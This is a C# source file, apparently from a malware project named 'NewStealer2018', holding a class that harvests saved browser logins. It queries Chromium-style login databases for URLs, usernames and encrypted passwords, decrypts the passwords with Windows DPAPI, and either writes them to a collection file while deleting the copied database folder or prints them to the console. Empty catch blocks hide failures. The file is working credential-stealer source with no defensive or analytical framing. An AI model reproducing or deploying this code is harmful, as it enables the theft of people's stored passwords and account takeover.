namespace NewStealer2018
{
    using System;
    using System.Data;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;

    public class GetEnginePassword
    {
        private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            using (var stream = new MemoryStream())
            {
                long bytesRead, fieldOffset = 0;
                var buffer = new byte[(0x2 * 0x400)];
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
        private static readonly string CommandText = "SELECT origin_url, username_value, password_value FROM logins";

        private static StringBuilder SB = new StringBuilder();

        public static void FindAllPassword(bool SetStatus)
        {
            for (var i = 0; i < SearchLogin.GetLogins.Count; i++)
            {
                try
                {
                    using (var Connect = new SQLiteConnection($"Data Source={SearchLogin.GetLogins[i]};Version=3;New=False;Compress=True;"))
                    {
                        Connect.Open();
                        using (var ComText = new SQLiteCommand(CommandText, Connect))
                        {
                            ComText.CommandType = CommandType.Text;
                            using (SQLiteDataReader reader = ComText.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        var Url = reader.GetString(0);
                                        var Login = reader.GetString(1);
                                        var Password = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 0x2), null, DataProtectionScope.LocalMachine));
                                        if (!string.IsNullOrEmpty(Url) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password)) // Проверяем нет ли пустых данных в базе
                                        {
                                            SB.AppendLine(Url);
                                            SB.AppendLine(Login);
                                            SB.AppendLine($"{Password}\r\n");
                                            switch (SetStatus)
                                            {
                                                case true:
                                                    File.AppendAllText(GetDirPath.Pass_File, SB.ToString());
                                                    Directory.Delete(Path.Combine(GetDirPath.User_Name, "Logins"), true);
                                                    break;
                                                case false:
                                                    Console.WriteLine($"ссылка: {Url}");
                                                    Console.WriteLine($"логин:  {Login}");
                                                    Console.WriteLine($"пароль: {Password}\r\n");
                                                    break;
                                                default:
                                                    break;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch { }
            }
        }
    }
}